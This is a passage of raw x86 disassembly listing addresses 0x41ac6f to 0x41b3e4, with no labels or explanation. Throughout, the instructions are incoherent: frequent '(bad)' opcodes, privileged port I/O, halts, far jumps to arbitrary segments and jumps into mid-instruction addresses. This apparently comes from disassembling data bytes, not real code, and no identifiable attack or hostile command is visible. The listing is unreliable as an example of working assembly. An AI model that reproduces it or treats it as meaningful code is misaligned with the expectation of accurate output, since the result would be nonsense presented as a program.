  41ac6f:	or     al,0x92
  41ac71:	(bad)  ds:0xcf388ee7
  41ac77:	pop    edx
  41ac78:	or     al,0x46
  41ac7a:	jns    0x41acc8
  41ac7c:	pop    eax
  41ac7e:	dec    ebp
  41ac7f:	push   eax
  41ac80:	sbb    al,0xf0
  41ac82:	mov    ds:0x3024d87,eax
  41ac87:	inc    ebp
  41ac88:	inc    ebp
  41ac89:	dec    edi
  41ac8a:	push   edi
  41ac8b:	cmp    al,0x36
  41ac8d:	rcl    DWORD PTR ds:0x2781feb3,0x57
  41ac94:	cld    
  41ac95:	bound  ebp,QWORD PTR [ecx-0x1c]
  41ac98:	mov    ah,0x97
  41ac9a:	ss xchg ebp,eax
  41ac9c:	(bad)  
  41ac9d:	in     al,0xf1
  41ac9f:	call   0xca85:0x6979967
  41aca6:	das    
  41aca7:	jo     0x41ac72
  41aca9:	mov    ecx,0x8e491981
  41acae:	icebp  
  41acaf:	loope  0x41acd2
  41acb1:	stc    
  41acb2:	mov    ch,0x9d
  41acb4:	int    0x2b
  41acb6:	sbb    al,0x63
  41acb8:	(bad)  [esi+ebx*1]
  41acbb:	rol    BYTE PTR ds:0xbcb4d782,cl
  41acc1:	jno    0x41acbd
  41acc3:	mov    DWORD PTR [esi+0x6c],esp
  41acc6:	cmp    al,BYTE PTR [ecx]
  41acc8:	add    eax,0x4c4e8c60
  41accd:	add    DWORD PTR [edi+0x7ee04ef7],edi
  41acd3:	cmp    eax,0x45090d4c
  41acd8:	out    dx,al
  41acd9:	push   edx
  41acda:	jp     0x41ace0
  41acdc:	call   0x814c06ab
  41ace1:	sub    al,0x64
  41ace3:	pop    ds
  41ace4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ace5:	fcom   DWORD PTR [eax]
  41ace7:	pusha  
  41ace8:	or     BYTE PTR [eax-0x1fa0d780],ch
  41acee:	call   0x982b:0x51c5671c
  41acf5:	sti    
  41acf6:	popf   
  41acf7:	mov    BYTE PTR [edx*1+0x3a5ba936],dl
  41acfe:	pop    ecx
  41acff:	fsubr  DWORD PTR [ecx+esi*4-0x4]
  41ad03:	mov    al,ds:0xe45fddc3
  41ad08:	or     BYTE PTR [eax-0x44],bh
  41ad0b:	and    DWORD PTR [ecx-0x33],esi
  41ad0e:	xchg   BYTE PTR [eax-0x45],ch
  41ad11:	iret   
  41ad12:	push   ss
  41ad13:	and    eax,0xce962b0d
  41ad18:	jge    0x41ad4b
  41ad1a:	ss jne 0x41aca2
  41ad1d:	pop    ebp
  41ad1e:	jg     0x41ad06
  41ad20:	mov    eax,ds:0x5d816e15
  41ad25:	xchg   esp,eax
  41ad26:	add    BYTE PTR [eax+eax*1],dl
  41ad29:	xor    BYTE PTR ds:0x92ee2a28,bh
  41ad2f:	ret    
  41ad30:	dec    ecx
  41ad31:	lahf   
  41ad32:	repz fld QWORD PTR [edi+eiz*2-0x7db59caf]
  41ad3a:	inc    eax
  41ad3b:	mov    eax,ds:0x65bb8024
  41ad40:	sbb    ebp,ebp
  41ad42:	cmp    eax,DWORD PTR [edi-0x68]
  41ad45:	sbb    esi,DWORD PTR [edx+0x6b66ad0f]
  41ad4b:	fidiv  WORD PTR [ecx]
  41ad4d:	push   es
  41ad4e:	adc    al,0xfb
  41ad50:	ss ret 
  41ad52:	mov    ecx,0xddceede1
  41ad57:	aad    0xb9
  41ad59:	xchg   esp,eax
  41ad5a:	mov    esi,0xe8adf08a
  41ad5f:	mov    DWORD PTR [eax],eax
  41ad61:	mov    ds:0xa2ada834,eax
  41ad66:	dec    ecx
  41ad67:	push   esi
  41ad68:	jl     0x41ad40
  41ad6a:	sti    
  41ad6b:	mov    esp,0xff01aeda
  41ad70:	dec    edx
  41ad71:	xchg   ebx,eax
  41ad72:	mov    BYTE PTR [edx-0x39],0x5f
  41ad76:	xchg   esi,eax
  41ad77:	sbb    DWORD PTR [edi-0x1476bcd2],0x49381220
  41ad81:	mov    eax,ds:0x48e3ac22
  41ad86:	mov    al,ds:0xa3579c04
  41ad8b:	xchg   edx,eax
  41ad8c:	push   esi
  41ad8d:	mov    ss,WORD PTR [esi+0x2b3bed5e]
  41ad93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad94:	jmp    0x196f:0xa016c8f8
  41ad9b:	call   esi
  41ad9d:	shl    DWORD PTR [ecx+0x36],0x24
  41ada1:	dec    eax
  41ada2:	pop    ebx
  41ada4:	sti    
  41ada5:	mov    WORD PTR [edi],?
  41ada7:	or     ah,bl
  41ada9:	xor    DWORD PTR [ebx-0x5f],0x6b
  41adad:	in     al,dx
  41adae:	popa   
  41adaf:	test   DWORD PTR [ebp-0xb],eax
  41adb2:	(bad)  
  41adb3:	push   ss
  41adb4:	int    0xb5
  41adb6:	ins    DWORD PTR es:[edi],dx
  41adb7:	inc    esp
  41adb8:	mov    ch,0x96
  41adba:	bnd jnp 0x41ade1
  41adbd:	xchg   ebp,eax
  41adbe:	jmp    0x41ad67
  41adc0:	xchg   BYTE PTR [ecx+0x33a00d2c],ch
  41adc6:	push   eax
  41adc7:	fbstp  TBYTE PTR ds:0x3930ec50
  41adcd:	xlat   BYTE PTR ds:[ebx]
  41adce:	sub    bl,BYTE PTR [edi-0x24]
  41add1:	push   ss
  41add2:	xchg   edi,eax
  41add3:	adc    bh,BYTE PTR [ebx]
  41add5:	adc    eax,esi
  41add7:	xchg   edi,eax
  41add8:	repnz ds push ebp
  41addb:	popa   
  41addc:	scas   al,BYTE PTR es:[edi]
  41addd:	cwde   
  41adde:	aaa    
  41addf:	rcl    DWORD PTR [esi-0x6c70be2d],0x31
  41ade6:	and    bl,dh
  41ade8:	cdq    
  41ade9:	inc    ebp
  41adea:	add    al,0x3f
  41adec:	ret    0xbaa3
  41adef:	jge    0x41ae2e
  41adf1:	push   ebx
  41adf2:	outs   dx,BYTE PTR ds:[esi]
  41adf3:	xchg   ebx,eax
  41adf4:	pop    ds
  41adf5:	ins    BYTE PTR es:[edi],dx
  41adf6:	rcr    BYTE PTR [ecx],0x92
  41adf9:	fucomip st,st(7)
  41adfb:	cmp    eax,0x3779deb3
  41ae00:	das    
  41ae01:	sub    eax,0xce5f26f5
  41ae06:	xor    al,0x1b
  41ae08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae09:	inc    esp
  41ae0a:	mov    ah,0xab
  41ae0c:	add    bh,BYTE PTR [ebp+0x4125721f]
  41ae12:	je     0x41ae5b
  41ae14:	fidivr WORD PTR [ebx+eiz*1]
  41ae17:	and    eax,0x7932a219
  41ae1c:	pusha  
  41ae1d:	retf   
  41ae1e:	jne    0x41ade7
  41ae20:	or     dh,dh
  41ae22:	add    eax,0x326630e
  41ae27:	adc    al,0x5b
  41ae29:	es gs aad 0xd8
  41ae2d:	in     eax,dx
  41ae2e:	pop    ecx
  41ae2f:	push   esp
  41ae30:	jae    0x41ae12
  41ae32:	and    bh,ch
  41ae34:	pusha  
  41ae35:	jp     0x41addc
  41ae37:	icebp  
  41ae38:	xor    esi,eax
  41ae3a:	jecxz  0x41ae82
  41ae3c:	sub    esp,edi
  41ae3e:	lahf   
  41ae3f:	add    esp,esi
  41ae41:	hlt    
  41ae42:	mov    edx,DWORD PTR [esi+0x33421ee9]
  41ae48:	test   DWORD PTR [edx-0x219c0f92],edi
  41ae4e:	push   edx
  41ae4f:	sub    BYTE PTR cs:0x16e8e1b0,al
  41ae56:	inc    ebx
  41ae57:	aaa    
  41ae58:	in     eax,dx
  41ae59:	and    cl,BYTE PTR [ebx+0x4b]
  41ae5c:	xchg   edi,eax
  41ae5d:	jp     0x41ae8e
  41ae5f:	lods   eax,DWORD PTR ds:[esi]
  41ae60:	xor    eax,0x632ba446
  41ae65:	hlt    
  41ae66:	jbe    0x41aeb9
  41ae68:	in     al,0xaa
  41ae6a:	rol    edi,0x41
  41ae6d:	clc    
  41ae6e:	push   edi
  41ae6f:	jmp    0xab15:0x927fb3b5
  41ae76:	sti    
  41ae77:	pusha  
  41ae78:	enter  0x468b,0xe
  41ae7c:	adc    al,0xec
  41ae7e:	lock iret 
  41ae80:	fsubr  DWORD PTR [ebx+0x2db226df]
  41ae86:	cmp    DWORD PTR [edi+0x28821a9f],edx
  41ae8c:	xlat   BYTE PTR ds:[ebx]
  41ae8d:	daa    
  41ae8e:	jno    0x41aea7
  41ae90:	push   edx
  41ae91:	rcl    BYTE PTR [edi-0x54ec4919],0x1a
  41ae98:	mov    dh,0x97
  41ae9a:	ja     0x41aec5
  41ae9c:	mov    ds:0x7c16b479,eax
  41aea1:	imul   esi,esp,0xffffffed
  41aea4:	ins    DWORD PTR es:[edi],dx
  41aea5:	adc    dl,cl
  41aea7:	arpl   WORD PTR [esi+0xa],bx
  41aeaa:	lea    esi,[edx+0x1e]
  41aead:	sbb    BYTE PTR [ebx],0xa
  41aeb0:	push   ss
  41aeb1:	push   0x915415af
  41aeb6:	mov    cl,BYTE PTR [edi]
  41aeb8:	sbb    ebx,edi
  41aeba:	adc    BYTE PTR [edx+0x26d181a6],ah
  41aec0:	mov    ss,WORD PTR [ebx+ecx*2+0x32]
  41aec4:	lahf   
  41aec5:	mov    ds:0x8c53c89,eax
  41aeca:	add    cl,bh
  41aecc:	cmp    eax,edx
  41aece:	das    
  41aecf:	mov    BYTE PTR [ecx],bl
  41aed1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aed2:	inc    ebp
  41aed3:	std    
  41aed4:	idiv   DWORD PTR [ebp+0x5b136b6c]
  41aeda:	mov    di,0xb70a
  41aede:	mov    WORD PTR ss:[ebx],ss
  41aee1:	mov    ch,0x2f
  41aee3:	inc    eax
  41aee4:	push   0x58
  41aee6:	mov    ds:0x8b2e79a,al
  41aeeb:	sub    cl,ch
  41aeed:	ins    BYTE PTR es:[edi],dx
  41aeee:	mov    eax,0x185a2c0d
  41aef3:	out    0xf2,al
  41aef5:	cmp    BYTE PTR [ebp+0x21],ah
  41aef8:	push   cs
  41aef9:	sub    edx,ebp
  41aefb:	fmul   QWORD PTR [ecx-0x51]
  41aefe:	jmp    0x44f8ce46
  41af03:	mov    ds:0xe7442fc,al
  41af08:	das    
  41af09:	in     al,0x3a
  41af0b:	(bad)  
  41af0c:	loope  0x41af61
  41af0e:	std    
  41af0f:	xchg   ebx,eax
  41af10:	and    al,0x39
  41af12:	mov    eax,ds:0x8d3f60a
  41af17:	push   esi
  41af18:	xor    al,0xa2
  41af1a:	mov    eax,0xede2de14
  41af1f:	add    al,0x1b
  41af21:	loop   0x41af3b
  41af23:	pop    es
  41af24:	ja     0x41af69
  41af26:	xor    BYTE PTR [esi-0x3797fd41],0x20
  41af2d:	cmp    bh,ch
  41af2f:	cmp    al,0xfb
  41af31:	or     al,BYTE PTR [edx]
  41af33:	push   ecx
  41af34:	test   eax,0x32de24ee
  41af39:	call   0x5dd1471b
  41af3e:	enter  0xe364,0x8a
  41af42:	lahf   
  41af43:	sub    ebp,esi
  41af45:	add    BYTE PTR [esi+0x2],al
  41af48:	stos   BYTE PTR es:[edi],al
  41af49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af4a:	ja     0x41af57
  41af4c:	test   al,0xd
  41af4e:	add    cl,0xcf
  41af51:	or     cl,BYTE PTR [ecx-0x7a649a05]
  41af57:	int    0xe6
  41af59:	pop    esp
  41af5a:	(bad)  
  41af5b:	int    0x63
  41af5d:	cmp    esp,DWORD PTR [esi]
  41af5f:	out    0x8f,eax
  41af61:	cmp    DWORD PTR [ebx+edx*1+0x7f51ded],ebp
  41af68:	xchg   edx,eax
  41af69:	pop    esi
  41af6a:	lods   eax,DWORD PTR ds:[esi]
  41af6b:	jno    0x41afb2
  41af6d:	dec    edi
  41af6e:	xchg   ecx,eax
  41af6f:	test   DWORD PTR [eax+0x3ce1d387],edx
  41af75:	or     BYTE PTR [edx],ah
  41af77:	das    
  41af78:	or     ch,dl
  41af7a:	sub    eax,0x7dda0241
  41af7f:	scas   eax,DWORD PTR es:[edi]
  41af80:	(bad)  
  41af81:	(bad)  
  41af82:	cmp    eax,0x3ad8fa0f
  41af87:	bound  edx,QWORD PTR [ebp+0x61]
  41af8a:	aam    0xff
  41af8c:	(bad)  
  41af8e:	adc    al,0x6c
  41af90:	loopne 0x41afd0
  41af92:	inc    esi
  41af93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af94:	dec    ebp
  41af95:	fisubr DWORD PTR [edx+0x463cc148]
  41af9b:	sbb    al,0x7c
  41af9d:	(bad)  
  41af9e:	imul   ebx,edx,0x29
  41afa1:	dec    eax
  41afa2:	jb     0x41af47
  41afa4:	stos   DWORD PTR es:[edi],eax
  41afa5:	and    bl,ch
  41afa7:	mov    ds:0x98e72f86,al
  41afac:	and    eax,0x12b80f58
  41afb1:	out    dx,eax
  41afb2:	pop    edx
  41afb3:	stos   BYTE PTR es:[edi],al
  41afb4:	imul   eax,eax,0x96d2a4f2
  41afba:	dec    edx
  41afbb:	jl     0x41b034
  41afbd:	dec    ebx
  41afbe:	data16 ins BYTE PTR es:[edi],dx
  41afc0:	xchg   edi,eax
  41afc1:	(bad)  
  41afc2:	jp     0x41af4f
  41afc4:	repnz fcom QWORD PTR [eax-0xc830a84]
  41afcb:	dec    eax
  41afcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afcd:	mov    esp,0xaa328c62
  41afd2:	(bad)  
  41afd3:	mov    ch,0xab
  41afd5:	xor    edx,DWORD PTR [eax+0x403f297d]
  41afdb:	inc    eax
  41afdc:	(bad)  
  41afdd:	test   al,0xa3
  41afdf:	push   es
  41afe0:	sbb    BYTE PTR gs:[ebx-0x71],dl
  41afe4:	inc    ebp
  41afe5:	cdq    
  41afe6:	fs mov al,0x43
  41afe9:	jmp    0x4b3c:0x92dfb869
  41aff0:	sub    al,0xb4
  41aff2:	sahf   
  41aff3:	hlt    
  41aff4:	sbb    bh,BYTE PTR [esi+0x2d]
  41aff7:	jmp    0xccc4d93a
  41affc:	shl    dh,1
  41affe:	xchg   esi,eax
  41afff:	stos   BYTE PTR es:[edi],al
  41b000:	push   eax
  41b001:	inc    edi
  41b002:	in     eax,dx
  41b003:	push   es
  41b004:	mov    dh,bl
  41b006:	push   ebx
  41b007:	cdq    
  41b008:	push   eax
  41b009:	xor    BYTE PTR [edi-0x7111d36b],dl
  41b00f:	ret    
  41b010:	lods   al,BYTE PTR ds:[esi]
  41b011:	arpl   WORD PTR [edi-0x39],di
  41b014:	push   ecx
  41b015:	loopne 0x41afcc
  41b017:	xchg   ebx,eax
  41b018:	dec    ebp
  41b019:	push   esi
  41b01a:	mov    ebp,0x2b4809b2
  41b01f:	mov    ah,0x24
  41b021:	jo     0x41afdb
  41b023:	push   edx
  41b024:	mov    ebp,0x52c9680
  41b029:	and    ah,BYTE PTR [ecx-0x57]
  41b02c:	adc    eax,0x11a4f04f
  41b031:	(bad)  
  41b032:	mov    al,0xbd
  41b034:	fld    TBYTE PTR [esi+0x5a]
  41b037:	fist   WORD PTR [esi-0x4413fc94]
  41b03d:	repz icebp 
  41b03f:	jne    0x41b062
  41b041:	retf   0x7907
  41b044:	clc    
  41b045:	stos   BYTE PTR es:[edi],al
  41b046:	mov    ecx,0xbadac0b1
  41b04b:	xor    al,0xfe
  41b04d:	or     al,0x70
  41b04f:	cmp    edi,DWORD PTR cs:[edx+0x22]
  41b053:	rcl    esp,cl
  41b055:	dec    ecx
  41b056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b057:	in     eax,dx
  41b058:	jmp    FWORD PTR [eax]
  41b05a:	mov    eax,DWORD PTR [ecx+0x6a]
  41b05d:	ficomp DWORD PTR [edx+ecx*4]
  41b060:	mov    WORD PTR [edi+0x60],ds
  41b063:	mov    esi,0x325330fd
  41b068:	int    0xe5
  41b06a:	mov    edi,0x6c5e772a
  41b06f:	stos   DWORD PTR es:[edi],eax
  41b070:	adc    esi,esp
  41b072:	mov    ds:0xb6a2eb40,al
  41b077:	in     al,dx
  41b078:	aaa    
  41b079:	cmp    ebp,0x8a6f44ea
  41b07f:	add    dh,al
  41b081:	dec    edx
  41b082:	sar    DWORD PTR [ebx-0x7e],0xeb
  41b086:	mov    ah,0x47
  41b088:	loope  0x41b011
  41b08a:	ds pop es
  41b08c:	nop
  41b08d:	or     bh,BYTE PTR [ecx+0x56429f84]
  41b093:	mov    bl,0xc7
  41b095:	lds    esp,FWORD PTR [edi+0x7fa88c77]
  41b09b:	jg     0x41b0fe
  41b09d:	cmp    DWORD PTR [esi],esp
  41b09f:	adc    al,0xd6
  41b0a1:	loop   0x41b0b7
  41b0a3:	mov    bh,0x3
  41b0a5:	leave  
  41b0a6:	mov    BYTE PTR [ebp+0x37],bh
  41b0a9:	sar    DWORD PTR [ebp+0x12],1
  41b0ac:	mov    DWORD PTR [ecx+0x56],ecx
  41b0af:	retf   
  41b0b0:	imul   esi,DWORD PTR [ebp-0x23],0xda92e05d
  41b0b7:	dec    ecx
  41b0b8:	and    DWORD PTR [ebx+0x51],0xb271c797
  41b0bf:	stos   DWORD PTR es:[edi],eax
  41b0c0:	stc    
  41b0c1:	test   ecx,esi
  41b0c3:	xor    DWORD PTR [edi-0x53],ebx
  41b0c6:	jns    0x41b0b2
  41b0c8:	retf   0x845c
  41b0cb:	sbb    cl,BYTE PTR [ecx+0x3f78d212]
  41b0d1:	or     eax,0x9104622c
  41b0d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0d7:	enter  0x5b7,0x1
  41b0db:	sub    DWORD PTR [edx],ebp
  41b0dd:	jl     0x41b13b
  41b0df:	sub    esp,DWORD PTR [eax]
  41b0e1:	jae    0x41b096
  41b0e3:	ss out dx,eax
  41b0e5:	dec    edx
  41b0e6:	iret   
  41b0e7:	jae    0x41b09d
  41b0e9:	mov    bl,0x18
  41b0eb:	mov    ah,0x33
  41b0ed:	lea    ebx,[ebp-0x4c]
  41b0f0:	sahf   
  41b0f1:	test   eax,0x9ed5d7a3
  41b0f6:	arpl   WORD PTR [ebx+0x3e],bx
  41b0f9:	retf   
  41b0fa:	adc    al,0x32
  41b0fc:	and    ebx,esi
  41b0fe:	mov    esp,0x7d020e8d
  41b103:	push   ebp
  41b104:	xchg   ecx,eax
  41b105:	xor    eax,DWORD PTR [ecx]
  41b107:	push   esi
  41b108:	cli    
  41b109:	sub    eax,0x8091430e
  41b10e:	pop    ebp
  41b10f:	mov    edi,0x7c5ddc20
  41b114:	aaa    
  41b115:	jp     0x41b13a
  41b117:	mov    ss,WORD PTR [edi]
  41b119:	arpl   WORD PTR [edi-0x1e8756d3],sp
  41b11f:	mov    WORD PTR [ebx],fs
  41b121:	dec    edi
  41b122:	mov    bh,0x67
  41b124:	int3   
  41b125:	sub    bl,bl
  41b127:	mov    eax,0x49e0fc6e
  41b12c:	sub    eax,0xeb2d09bb
  41b131:	mov    ebx,0xe6e55613
  41b136:	test   ah,bl
  41b138:	rol    DWORD PTR [edi+0x6],1
  41b13b:	stos   DWORD PTR es:[edi],eax
  41b13c:	cli    
  41b13d:	mov    DWORD PTR [esi+0x47],ebx
  41b140:	mov    ebx,0x78c90a16
  41b145:	or     al,BYTE PTR [edx]
  41b147:	inc    esp
  41b148:	jae    0x41b16e
  41b14a:	or     al,cl
  41b14c:	imul   esi,DWORD PTR [edi],0x1e8aba07
  41b152:	shld   ebp,eax,0x29
  41b156:	outs   dx,DWORD PTR ds:[esi]
  41b157:	sub    dh,BYTE PTR [eax-0x48]
  41b15a:	ds pop es
  41b15c:	adc    al,BYTE PTR [eax]
  41b15e:	jae    0x41b122
  41b160:	jp     0x41b146
  41b162:	pushf  
  41b163:	shl    bh,0xdc
  41b166:	cmp    eax,0x49425b62
  41b16b:	push   eax
  41b16c:	cmp    cl,BYTE PTR [edi]
  41b16e:	jae    0x41b10b
  41b170:	enter  0xf8fe,0xc7
  41b174:	sbb    esp,DWORD PTR [edi]
  41b176:	sub    al,0x88
  41b178:	hlt    
  41b179:	push   0xf84cf3f5
  41b17e:	sar    BYTE PTR [esi-0x69],1
  41b181:	jmp    DWORD PTR [edx+0x1dfc784]
  41b187:	fcom   st(2)
  41b189:	cmp    al,0xa2
  41b18b:	ins    DWORD PTR es:[edi],dx
  41b18c:	ds add al,0xa0
  41b18f:	or     BYTE PTR [eax],ch
  41b191:	jbe    0x41b16b
  41b193:	cwde   
  41b194:	test   DWORD PTR [ecx],ecx
  41b196:	cwde   
  41b197:	(bad)  
  41b198:	cmp    al,0xec
  41b19a:	popa   
  41b19b:	imul   esp,DWORD PTR [ecx+0x6d],0x54
  41b19f:	in     eax,dx
  41b1a0:	adc    ebp,DWORD PTR [ebp-0x6e]
  41b1a3:	xor    eax,0x12cfe77
  41b1a8:	mov    eax,0x450e73fb
  41b1ad:	xor    ah,BYTE PTR [eax+0x7b29f9a0]
  41b1b3:	(bad)  
  41b1b4:	push   ss
  41b1b5:	fst    QWORD PTR [esi+0x41]
  41b1b8:	cmp    esi,ebp
  41b1ba:	jge    0x41b226
  41b1bc:	scas   eax,DWORD PTR es:[edi]
  41b1bd:	sbb    eax,0x76e2cfb5
  41b1c2:	inc    edi
  41b1c3:	js     0x41b18d
  41b1c5:	out    dx,eax
  41b1c6:	dec    ebp
  41b1c7:	mov    cl,0x34
  41b1c9:	add    cl,BYTE PTR [edx-0x5f]
  41b1cc:	mov    WORD PTR [ebp-0x4521f7ac],fs
  41b1d2:	pop    ebx
  41b1d3:	push   edx
  41b1d4:	jmp    0x6ee9:0xc2ed1e26
  41b1db:	aad    0xa6
  41b1dd:	(bad)  
  41b1de:	pop    ss
  41b1df:	lds    esi,FWORD PTR [ebx]
  41b1e1:	add    ebx,ecx
  41b1e3:	imul   esi,DWORD PTR ds:0x90bfd34d,0x5cb996d2
  41b1ed:	sub    DWORD PTR [edx],edx
  41b1ef:	stos   DWORD PTR es:[edi],eax
  41b1f0:	dec    bh
  41b1f2:	or     al,0xdb
  41b1f4:	mov    eax,0x8faf1506
  41b1f9:	mov    bl,0xe1
  41b1fb:	push   ebp
  41b1fc:	shl    bh,0xe2
  41b1ff:	lea    esi,[ebx]
  41b201:	xchg   ebx,eax
  41b202:	loope  0x41b1df
  41b204:	in     eax,dx
  41b205:	mov    BYTE PTR [ecx],cl
  41b207:	push   0x474f1271
  41b20c:	mov    ecx,cs
  41b20e:	xchg   esp,eax
  41b20f:	and    eax,0xdf099ff2
  41b214:	jp     0x41b1c8
  41b216:	pop    ebp
  41b217:	mov    dl,0xf6
  41b219:	cmc    
  41b21a:	fwait
  41b21b:	cmp    BYTE PTR [esi-0x59],dh
  41b21e:	dec    ebp
  41b21f:	(bad)  
  41b220:	jne    0x41b28d
  41b222:	mov    ds:0x9db05b08,eax
  41b227:	inc    ebx
  41b228:	dec    ebx
  41b229:	inc    esp
  41b22a:	(bad)  
  41b22b:	mov    ecx,0x753ccea
  41b230:	cwde   
  41b231:	sbb    ebx,edi
  41b233:	cmp    DWORD PTR [eax],0x6419b570
  41b239:	mov    ebx,0x5f7c1584
  41b23e:	sub    ebp,ebx
  41b240:	adc    eax,0xd500f1b8
  41b245:	lock pop es
  41b247:	outs   dx,BYTE PTR ds:[esi]
  41b248:	sbb    edx,DWORD PTR [eax]
  41b24a:	(bad)  
  41b24c:	inc    esi
  41b24d:	xchg   ecx,eax
  41b24e:	cmp    eax,0x501d2ad3
  41b253:	into   
  41b254:	das    
  41b255:	hlt    
  41b256:	jb     0x41b1f5
  41b258:	aaa    
  41b259:	dec    esi
  41b25a:	addr16 mov eax,0xd4bc96d6
  41b260:	sub    BYTE PTR [eax-0x2169b7e5],cl
  41b266:	adc    eax,0x89bbb0e0
  41b26b:	inc    esp
  41b26c:	push   0xffffffe6
  41b26e:	je     0x41b208
  41b270:	popf   
  41b271:	pusha  
  41b272:	imul   eax,DWORD PTR [ebx-0x1a],0x53eb2b35
  41b279:	pop    es
  41b27a:	clc    
  41b27b:	cwde   
  41b27c:	add    eax,0xa18c0808
  41b281:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b282:	and    cl,BYTE PTR [ebp+0x4a0eb508]
  41b288:	out    0xc5,eax
  41b28a:	mov    ds:0x149ec3c7,al
  41b28f:	sbb    DWORD PTR [edi-0x683a8d9c],esi
  41b295:	xchg   esi,eax
  41b296:	retf   
  41b297:	scas   eax,DWORD PTR es:[edi]
  41b298:	xor    BYTE PTR [eax+0x73],bl
  41b29b:	sub    BYTE PTR [eax],dh
  41b29d:	push   ebp
  41b29e:	adc    al,0xb2
  41b2a0:	mov    BYTE PTR [edx-0x5a3bae91],ah
  41b2a6:	push   0xc441cbe4
  41b2ab:	outs   dx,DWORD PTR ds:[esi]
  41b2ac:	outs   dx,BYTE PTR ds:[esi]
  41b2ad:	add    ch,dh
  41b2af:	pop    esp
  41b2b0:	fwait
  41b2b1:	ins    BYTE PTR es:[edi],dx
  41b2b2:	rcr    BYTE PTR [eax],cl
  41b2b4:	dec    esi
  41b2b5:	mov    esi,0xd3cd5b9
  41b2ba:	je     0x41b2d1
  41b2bc:	adc    esi,edi
  41b2be:	(bad)  
  41b2bf:	ins    BYTE PTR es:[edi],dx
  41b2c0:	xor    ebx,ecx
  41b2c2:	ins    DWORD PTR es:[edi],dx
  41b2c3:	dec    ecx
  41b2c4:	inc    eax
  41b2c5:	js     0x41b321
  41b2c7:	push   eax
  41b2c8:	(bad)  
  41b2c9:	in     al,0x6c
  41b2cb:	adc    edi,ebp
  41b2cd:	aas    
  41b2ce:	js     0x41b2ba
  41b2d0:	leave  
  41b2d1:	aas    
  41b2d2:	lea    eax,[eax-0x6b]
  41b2d5:	add    dh,bl
  41b2d7:	mov    BYTE PTR [edx+ebp*4+0x5a],0x7a
  41b2dc:	mov    al,0x7
  41b2de:	pop    ecx
  41b2df:	mov    al,ds:0x1a1c853c
  41b2e4:	jo     0x41b29a
  41b2e6:	es dec ebp
  41b2e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2e9:	mov    edx,0xb9cf1e31
  41b2ee:	inc    esi
  41b2ef:	jmp    0x819f:0x16f977a
  41b2f6:	mov    esi,0x633efdf7
  41b2fb:	loope  0x41b2af
  41b2fd:	and    bl,BYTE PTR [edx+ecx*8+0x17]
  41b301:	push   ebx
  41b302:	(bad)  [ecx+0xf]
  41b305:	sub    cl,BYTE PTR [ebx+0x57]
  41b308:	dec    edx
  41b309:	arpl   WORD PTR [ebp+0x5d0986b2],dx
  41b30f:	repz mov ebx,0x5cdc3f21
  41b315:	ins    BYTE PTR es:[edi],dx
  41b316:	push   es
  41b317:	out    0x88,al
  41b319:	push   es
  41b31a:	sub    DWORD PTR ds:0x1ecf2f48,eax
  41b320:	lock push ds
  41b322:	lahf   
  41b323:	push   ss
  41b324:	sub    BYTE PTR [eax+0x7858705d],ah
  41b32a:	daa    
  41b32b:	pop    esi
  41b32c:	mov    esi,ecx
  41b32e:	fidiv  DWORD PTR [ebp-0x10f13ec3]
  41b334:	loope  0x41b32e
  41b336:	cld    
  41b337:	js     0x41b3b6
  41b339:	retf   0xfa90
  41b33c:	in     al,dx
  41b33d:	mov    eax,0x82892722
  41b342:	jbe    0x41b3a5
  41b344:	and    BYTE PTR ds:0xe0a073cc,bl
  41b34a:	call   0x3bb08b4b
  41b34f:	imul   eax,DWORD PTR [esi+ebp*4],0xffffffba
  41b353:	popf   
  41b354:	jmp    FWORD PTR [edi-0x7576ef85]
  41b35a:	cld    
  41b35b:	repnz arpl WORD PTR [ebx+0x1a],di
  41b35f:	sub    DWORD PTR ds:[eax],eax
  41b362:	lds    eax,FWORD PTR cs:[esi+ebx*2-0x7a4f3be7]
  41b36a:	mov    dh,0x96
  41b36c:	inc    esp
  41b36d:	test   al,0xe0
  41b36f:	daa    
  41b370:	repnz (bad) 
  41b372:	clc    
  41b373:	into   
  41b374:	gs mov bl,0xfd
  41b377:	ins    DWORD PTR es:[edi],dx
  41b378:	pop    ss
  41b379:	push   0xe8f660d4
  41b37e:	or     bh,BYTE PTR [esi]
  41b380:	es test eax,0x61f0a0b0
  41b386:	push   esi
  41b387:	jnp    0x41b3f4
  41b389:	mov    eax,0x93f5c8bb
  41b38e:	(bad)  
  41b38f:	dec    esp
  41b390:	jge    0x41b402
  41b392:	rcl    DWORD PTR [eax],1
  41b394:	jne    0x41b3f2
  41b396:	lods   eax,DWORD PTR ds:[esi]
  41b397:	or     ebp,edi
  41b399:	inc    ecx
  41b39a:	test   BYTE PTR [edi+0x57110796],ah
  41b3a0:	mov    dl,0xf6
  41b3a2:	test   DWORD PTR [edi+eiz*1+0x235c2032],ebx
  41b3a9:	inc    ebp
  41b3aa:	push   0xffffffdc
  41b3ac:	cmp    DWORD PTR [esi-0x4a8ddebf],0xffffffeb
  41b3b3:	xchg   esp,eax
  41b3b4:	jecxz  0x41b346
  41b3b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3b7:	fmulp  st(6),st
  41b3b9:	clc    
  41b3ba:	sub    ebp,ecx
  41b3bc:	ds icebp 
  41b3be:	xchg   edx,edi
  41b3c0:	sbb    edi,DWORD PTR [edi]
  41b3c2:	sbb    eax,DWORD PTR [ecx-0x41]
  41b3c5:	clc    
  41b3c6:	or     edx,ecx
  41b3c8:	scas   al,BYTE PTR es:[edi]
  41b3c9:	fbstp  TBYTE PTR [eax]
  41b3cb:	add    ecx,DWORD PTR [edx+ebx*4+0x2ff87a38]
  41b3d2:	in     al,0xda
  41b3d4:	popa   
  41b3d5:	mov    esi,0x1f0788e4
  41b3da:	mov    edi,0xc4e061cd
  41b3df:	inc    edx
  41b3e0:	xchg   ebx,eax
  41b3e1:	jg     0x41b405
  41b3e3:	sahf   
  41b3e4:	out    dx,al
